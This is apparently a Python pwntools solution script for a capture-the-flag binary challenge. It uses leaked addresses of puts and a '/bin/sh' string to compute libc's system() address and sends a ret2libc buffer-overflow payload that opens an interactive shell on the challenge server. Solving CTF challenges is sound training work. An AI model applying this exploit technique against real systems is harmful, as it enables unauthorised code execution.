from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10017
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+31
        b *vuln+39
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')


base_system = 0x0003d3d0  # readelf -s libc-2.27.so | grep system
base_puts = 0x00067d90    # readelf -s libc-2.27.so | grep puts
popret = p32(0x0804861b)  # ropper --file chall --search pop

bin_sh_raw = p.recvline().decode().strip().split(" ")[-1]
print(f"Got bin sh at: {bin_sh_raw}")

bin_sh_address = int(bin_sh_raw, 16)
bin_sh = p32(bin_sh_address)

puts_address = p.recvline().decode().strip().split(" ")[-1]
print(f"Got puts at: {puts_address}")

offset_puts_to_system = base_system - base_puts
system_address = int(puts_address, 16) + offset_puts_to_system
system = p32(system_address)

dummy = b'A' * (8 + 12)
payload = dummy + system + popret + bin_sh
p.sendline(payload)

if LOCAL:
    sleep(2)
    print(p.recv())
    pause()
else:
    p.interactive()
    print(p.recvall())
